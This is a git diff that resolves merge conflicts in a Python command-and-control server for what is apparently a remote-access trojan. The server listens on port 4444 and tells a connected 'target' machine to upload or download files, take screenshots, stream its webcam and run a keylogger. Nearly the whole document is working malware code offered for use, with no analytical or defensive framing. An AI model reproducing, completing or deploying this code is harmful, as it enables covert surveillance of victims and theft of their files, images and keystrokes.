@@ -1,21 +1,13 @@
 import socket
 import subprocess
 import json
-<<<<<<< HEAD
-=======
-import queue
-import time
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
 import os
 import threading
 import cv2
 import numpy as np
 from termcolor import colored
 
-<<<<<<< HEAD
 
-=======
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
 def data_recv(target, timeout=60):
     data = ''
     target.settimeout(timeout)
@@ -31,23 +23,10 @@ def data_recv(target, timeout=60):
             except ValueError:
                 continue
         except socket.timeout:
-<<<<<<< HEAD
-            continue
-    return data
-
-
-def data_send(data, target):
-    try:
-        jsondata = json.dumps(data)
-        target.sendall(jsondata.encode('latin-1'))
-    except Exception as e:
-        print(f"Error sending data: {e}")
-
-
-=======
             print("Timeout occurred")
             continue
     return data
+
 
 def data_send(data, target):
     try:
@@ -56,7 +35,7 @@ def data_send(data, target):
     except Exception as e:
         print(f"Error sending data: {e}")
 
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
+
 def upload_file(file, target):
     try:
         with open(file, 'rb') as f:
@@ -69,10 +48,7 @@ def upload_file(file, target):
     except Exception as e:
         print(e)
 
-<<<<<<< HEAD
 
-=======
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
 def download_file(file, target):
     print("Downloading file...")
     data = b''
@@ -93,17 +69,10 @@ def download_file(file, target):
     finally:
         target.settimeout(None)
 
-<<<<<<< HEAD
 
 def keylogger_start(target):
     buffer = []
 
-=======
-def keylogger_start(target):
-    buffer = []
-
-
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
     def handle_keylogger():
         while True:
             data = data_recv(target)
@@ -137,7 +106,6 @@ def t_commun(target, ip):
                 download_file(comm[9:], target)
             elif comm[:10] == 'screenshot':
                 print("Capturing screenshot...")
-<<<<<<< HEAD
                 f = open(f'screenshot{count}.png', 'wb')
                 target.settimeout(5)
                 chunk = target.recv(4096)
@@ -151,18 +119,8 @@ def t_commun(target, ip):
                 target.settimeout(None)
                 print("Screenshot captured!")
                 f.close()
-=======
-                with open(f'screenshot{count}.png', 'wb') as f:
-                    target.settimeout(2)
-                    while True:
-                        chunk = target.recv(4096)
-                        if not chunk:
-                            break
-                        f.write(chunk)
-                    target.settimeout(None)
-                print("Screenshot captured!")
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
                 count += 1
+
             elif comm[:6] == 'webcam':
                 print("Receiving webcam...")
                 target.settimeout(5)
@@ -191,12 +149,8 @@ def t_commun(target, ip):
                         break
                 cv2.destroyAllWindows()
             elif comm[:10] == 'keylogger':
-<<<<<<< HEAD
                 keylogger_thread = threading.Thread(
                     target=keylogger_start, args=(target,), daemon=True)
-=======
-                keylogger_thread = threading.Thread(target=keylogger_start, args=(target,), daemon=True)
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
                 keylogger_thread.start()
                 print("Keylogger started!")
             elif comm == 'help':
@@ -217,15 +171,12 @@ def t_commun(target, ip):
         except Exception as e:
             print(f"Error: {e}")
 
-<<<<<<< HEAD
 
-=======
->>>>>>> 19d4beb97b1712fdf08dee7c2fb811c9ff3f0f06
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('0.0.0.0', 4444))
-print(colored('[...] Waiting for connections', 'red'))
+print(colored('[...] Waiting for connections', 'green'))
 sock.listen(3)
 
 target, ip = sock.accept()
-print(colored('[!] Connected to:' + str(ip), 'green'))
+print(colored('[!] Connected to:' + str(ip), 'red'))
 t_commun(target, ip)
